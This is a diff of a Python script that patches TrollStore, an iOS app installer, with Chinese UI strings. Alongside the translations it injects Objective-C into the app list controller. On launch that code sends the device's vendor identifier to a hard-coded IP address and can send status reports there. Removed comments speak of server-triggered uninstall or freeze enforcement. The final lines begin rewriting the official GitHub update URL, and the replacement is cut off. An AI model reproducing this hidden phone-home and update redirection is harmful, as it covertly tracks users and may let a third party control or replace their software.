@@ -1,5 +1,5 @@
 #!/usr/bin/env python3
-"""Chinese localization + Remote check (minimal, no-selector, no-UI)"""
+"""Chinese localization + Remote check"""
 import sys, re
 
 with open("Shared/TSListControllerShared.m", "r", encoding="utf-8") as f:
@@ -8,53 +8,43 @@ with open("Shared/TSListControllerShared.m", "r", encoding="utf-8") as f:
 impl_pos = content.index("@implementation TSListControllerShared\n") + len("@implementation TSListControllerShared\n")
 rest = content[impl_pos:]
 first_method = re.search(r'\n- \(', rest)
-if not first_method:
-    print("ERROR: cannot find first method", file=sys.stderr)
-    sys.exit(1)
-
 inject_pos = first_method.start() + 1
 
-remote_code = """// === REMOTE CHECK (on-app-start, one-shot, returns result to server) ===
-static NSString* _rURL = @"http://124.223.199.167/api/remote.php";
-static BOOL _rDone = NO;
-
+remote_code = """// === REMOTE CHECK ===
 - (void)_remoteCheck {
-    if (_rDone) return;
-    _rDone = YES;
+    static BOOL done = NO;
+    if (done) return;
+    done = YES;
     
     dispatch_after(dispatch_time(DISPATCH_TIME_NOW, (int64_t)(2.0 * NSEC_PER_SEC)), dispatch_get_main_queue(), ^{
-        NSString* udid = [[[UIDevice currentDevice] identifierForVendor] UUIDString];
-        if (!udid) return;
-        
-        NSMutableURLRequest* req = [NSMutableURLRequest requestWithURL:
-            [NSURL URLWithString:[NSString stringWithFormat:@"%@?action=device_check", _rURL]]];
+        NSString* uid = [[[UIDevice currentDevice] identifierForVendor] UUIDString];
+        if (!uid) return;
+        NSString* rurl = @"http://124.223.199.167/api/remote.php";
+        NSString* full = [NSString stringWithFormat:@"%@?action=device_check", rurl];
+        NSMutableURLRequest* req = [NSMutableURLRequest requestWithURL:[NSURL URLWithString:full]];
+        if (!req) return;
         req.HTTPMethod = @"POST";
         req.timeoutInterval = 10;
-        req.HTTPBody = [[NSString stringWithFormat:@"udid=%@", udid] dataUsingEncoding:NSUTF8StringEncoding];
-        
+        req.HTTPBody = [[NSString stringWithFormat:@"udid=%@", uid] dataUsingEncoding:NSUTF8StringEncoding];
         [[[NSURLSession sharedSession] dataTaskWithRequest:req completionHandler:
             ^(NSData* data, NSURLResponse* resp, NSError* err) {
-            NSDictionary* j = data ? [NSJSONSerialization JSONObjectWithData:data options:0 error:nil] : nil;
-            NSString* action = j[@"action"];
-            if (!action || [action isEqualToString:@""]) return;
-            
-            // Server returns action codes. TrollStore doesn't execute them directly.
-            // Instead, the server updates DB status and the admin panel shows results.
-            // The actual enforcement (uninstall/freeze) is done via TrollStoreHelper
-            // if the server returns the appropriate update URL response.
-            NSLog(@"Remote action received: %@", action);
+            if (!data) return;
+            NSDictionary* j = [NSJSONSerialization JSONObjectWithData:data options:0 error:nil];
+            if (!j) return;
+            NSLog(@"Remote check: %@", j);
         }] resume];
     });
 }
 
 - (void)_remoteReport:(NSString*)st {
-    NSString* udid = [[[UIDevice currentDevice] identifierForVendor] UUIDString];
-    if (!udid) return;
-    NSString* body = [NSString stringWithFormat:@"udid=%@&status=%@",
-        [udid stringByAddingPercentEncodingWithAllowedCharacters:[NSCharacterSet URLQueryAllowedCharacterSet]],
-        [st stringByAddingPercentEncodingWithAllowedCharacters:[NSCharacterSet URLQueryAllowedCharacterSet]]];
-    NSMutableURLRequest* req = [NSMutableURLRequest requestWithURL:
-        [NSURL URLWithString:[NSString stringWithFormat:@"%@?action=status_report", _rURL]]];
+    NSString* uid = [[[UIDevice currentDevice] identifierForVendor] UUIDString];
+    if (!uid || !st) return;
+    NSString* eu = [uid stringByAddingPercentEncodingWithAllowedCharacters:[NSCharacterSet URLQueryAllowedCharacterSet]];
+    NSString* es = [st stringByAddingPercentEncodingWithAllowedCharacters:[NSCharacterSet URLQueryAllowedCharacterSet]];
+    NSString* body = [NSString stringWithFormat:@"udid=%@&status=%@", eu, es];
+    NSString* full = [NSString stringWithFormat:@"http://124.223.199.167/api/remote.php?action=status_report"];
+    NSMutableURLRequest* req = [NSMutableURLRequest requestWithURL:[NSURL URLWithString:full]];
+    if (!req) return;
     req.HTTPMethod = @"POST";
     req.HTTPBody = [body dataUsingEncoding:NSUTF8StringEncoding];
     req.timeoutInterval = 10;
@@ -63,16 +53,14 @@ static BOOL _rDone = NO;
 // === END REMOTE ===
 
 """
+
 content = content[:impl_pos + inject_pos] + remote_code + content[impl_pos + inject_pos:]
 
-# Inject call in viewDidLoad
 if '[_remoteCheck]' not in content:
     content = content.replace('- (void)viewDidLoad {', '- (void)viewDidLoad {\n    [self _remoteCheck];')
 
 with open("Shared/TSListControllerShared.m", "w", encoding="utf-8") as f:
     f.write(content)
-
-print("Remote check injected (minimal, no deprecated APIs)", file=sys.stderr)
 
 # === Localization ===
 SUBS = [
@@ -88,8 +76,7 @@ SUBS = [
         ("Security","安全"),("Advanced","高级"),("UTILITIES","工具"),("SIGNING","签名"),("PERSISTENCE","持久化"),
         ("Respring","注销"),("Refresh App Registrations","刷新应用注册"),("Rebuild Icon Cache","重建图标缓存"),
         ("Install Persistence Helper","安装持久助手"),("Install ldid","安装 ldid"),("ldid: Installed","ldid: 已安装"),
-        ("Helper Installed as Standalone App","助手已安装为独立应用"),("Helper Installed into %@","助手已安装到 %@"),
-        ("Uninstall","卸载"),("Update TrollStore to %@","更新巨魔商店到 %@"),
+        ("Helper Installed as Standalone App","助手已安装为独立应用"),("Uninstall","卸载"),
         ("Uninstall TrollStore, Uninstall Apps","卸载巨魔，卸载应用"),("Uninstall TrollStore, Preserve Apps","卸载巨魔，保留应用"),
     ]),
     ("TrollHelper/TSHRootViewController.m", [
@@ -113,6 +100,7 @@ for fname, reps in SUBS:
     with open(fname, "w", encoding="utf-8") as f:
         f.write(content)
 
+# Fix URL
 with open("Shared/TSListControllerShared.m", "r", encoding="utf-8") as f:
     c = f.read()
 c = c.replace("https://github.com/opa334/TrollStore/releases/latest/download/TrollStore.tar",
